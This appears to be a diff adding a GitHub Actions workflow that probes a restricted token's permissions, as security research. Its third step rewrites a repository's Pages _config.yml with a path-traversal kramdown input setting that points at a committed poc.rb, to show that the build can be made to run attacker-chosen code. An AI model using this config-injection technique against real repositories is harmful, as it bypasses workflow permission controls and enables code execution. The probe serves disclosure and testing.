@@ -1,0 +1,74 @@
+name: restricted-identity
+on:
+  workflow_dispatch:
+
+# The identity under test. contents:write lets it change repository files.
+# It is NOT granted the `workflows` permission, so by GitHub's own fine-grained
+# permission model it must not be able to create or modify anything under
+# .github/workflows/. That is precisely the Pages allowlist's precondition:
+# "from user accounts that do not have actions workflow permissions".
+permissions:
+  contents: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: can this identity create a workflow, and can it change the build config
+        env:
+          TOK: ${{ github.token }}
+          R: ${{ github.repository }}
+        run: |
+          set -u
+          api() { # verb path datafile
+            curl -s -o /tmp/body.json -w '%{http_code}' -X "$1" \
+              -H "Authorization: Bearer $TOK" \
+              -H "Accept: application/vnd.github+json" \
+              -H "X-GitHub-Api-Version: 2022-11-28" \
+              --data-binary "@$3" "https://api.github.com/repos/$R/contents/$2"
+          }
+
+          echo "=== ARM A: create a workflow file. MUST be refused. ==="
+          cat > /tmp/wf.json <<'JSON'
+          {"message":"arm A","content":"bmFtZTogcGxhbnRlZApvbjogcHVzaApqb2JzOgogIHg6CiAgICBydW5zLW9uOiB1YnVudHUtbGF0ZXN0CiAgICBzdGVwczoKICAgICAgLSBydW46IGVjaG8gaGkK"}
+          JSON
+          A=$(api PUT ".github/workflows/planted.yml" /tmp/wf.json)
+          echo "  status=$A"
+          echo "  body: $(head -c 300 /tmp/body.json)"
+
+          echo
+          echo "=== ARM B CONTROL: an ordinary file. MUST succeed, proving contents:write works. ==="
+          cat > /tmp/ok.json <<'JSON'
+          {"message":"arm B control","content":"Y29udGVudHMtd3JpdGUtd29ya3MK"}
+          JSON
+          B=$(api PUT "arm-b-control.txt" /tmp/ok.json)
+          echo "  status=$B"
+
+          echo
+          echo "=== ARM C: change the Pages build configuration. ==="
+          SHA=$(curl -s -H "Authorization: Bearer $TOK" \
+                 -H "Accept: application/vnd.github+json" \
+                 "https://api.github.com/repos/$R/contents/_config.yml" \
+                 | python3 -c 'import json,sys;print(json.load(sys.stdin)["sha"])')
+          echo "  current _config.yml sha=$SHA"
+          # kramdown.input traversing to the committed poc.rb
+          python3 - "$SHA" > /tmp/cfg.json <<'PY'
+          import sys, base64, json
+          up = "../" * 20
+          body = (
+              "title: config handling probe\n"
+              "markdown: kramdown\n"
+              "kramdown:\n"
+              "  input: " + up + "github/workspace/poc\n"
+          ).encode()
+          print(json.dumps({"message": "arm C", "sha": sys.argv[1],
+                            "content": base64.b64encode(body).decode()}))
+          PY
+          C=$(api PUT "_config.yml" /tmp/cfg.json)
+          echo "  status=$C"
+
+          echo
+          echo "=============== READING ==============="
+          echo "  ARM A = $A   (403 means this identity cannot create a workflow)"
+          echo "  ARM B = $B   (2xx means contents:write is real, so A is a refusal not a dead token)"
+          echo "  ARM C = $C   (2xx means the same identity CAN change what the Pages build executes)"
